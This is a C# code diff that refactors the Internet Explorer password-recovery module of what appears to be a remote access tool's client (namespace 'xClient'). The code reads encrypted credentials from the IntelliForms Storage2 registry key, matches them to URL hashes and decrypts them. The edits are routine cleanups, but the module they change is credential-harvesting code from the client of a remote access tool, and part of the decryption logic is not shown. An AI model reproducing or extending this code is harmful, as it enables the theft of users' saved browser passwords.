@@ -3,11 +3,13 @@ using System.Collections;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.IO;
+using System.Linq;
 using System.Runtime.InteropServices;
 using System.Security.Cryptography;
 using System.Text;
 using Microsoft.Win32;
 using xClient.Core.Data;
+using xClient.Core.Helper;
 
 namespace xClient.Core.Recovery.Browsers
 {
@@ -57,7 +59,7 @@ namespace xClient.Core.Recovery.Browsers
         }
         #endregion
         #region Private Methods
-        private const string KeyStr = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
+        private const string regPath = "Software\\Microsoft\\Internet Explorer\\IntelliForms\\Storage2";
 
         static T ByteArrayToStructure<T>(byte[] bytes) where T : struct
         {
@@ -69,6 +71,8 @@ namespace xClient.Core.Recovery.Browsers
         }
         static bool DecryptIePassword(string url, List<string[]> dataList)
         {
+            byte[] cypherBytes;
+
             //Get the hash for the passed URL
             string urlHash = GetURLHashString(url);
 
@@ -77,14 +81,14 @@ namespace xClient.Core.Recovery.Browsers
                 return false;
 
             //Now retrieve the encrypted credentials for this registry hash entry....
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
-            if (key == null)
-                return false;
+            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
+            {
+                if (key == null) return false;
 
-            //Retrieve encrypted data for this website hash...
-            //First get the value...
-            byte[] cypherBytes = (byte[])key.GetValue(urlHash);
-            key.Close();
+                //Retrieve encrypted data for this website hash...
+                //First get the value...
+                cypherBytes = (byte[])key.GetValue(urlHash);
+            }
 
             // to use URL as optional entropy we must include trailing null character
             byte[] optionalEntropy = new byte[2 * (url.Length + 1)];
@@ -149,37 +153,25 @@ namespace xClient.Core.Recovery.Browsers
 
             }
             return true;
+        }
 
-        } //End of function
         static bool DoesURLMatchWithHash(string urlHash)
         {
-
             // enumerate values of the target registry
             bool result = false;
-            RegistryKey key = Registry.CurrentUser.OpenSubKey(KeyStr);
-            if (key == null)
-                return false;
 
-            string[] values = key.GetValueNames();
-            foreach (string value in values)
+            using (RegistryKey key = RegistryKeyHelper.OpenReadonlySubKey(RegistryHive.CurrentUser, regPath))
             {
+                if (key == null) return false;
 
-                // compare the value of the retrieved registry with the hash value of the history URL
-                if (value == urlHash)
-                {
-
+                if (key.GetValueNames().Any(value => value == urlHash))
                     result = true;
-                    break;
-
-                }
-
             }
             return result;
-
         }
+
         static string GetURLHashString(string wstrURL)
         {
-
             IntPtr hProv = IntPtr.Zero;
             IntPtr hHash = IntPtr.Zero;
 
@@ -220,7 +212,6 @@ namespace xClient.Core.Recovery.Browsers
             CryptReleaseContext(hProv, 0);
 
             return urlHash.ToString();
-
         }
         #endregion
         #region Win32 Interop
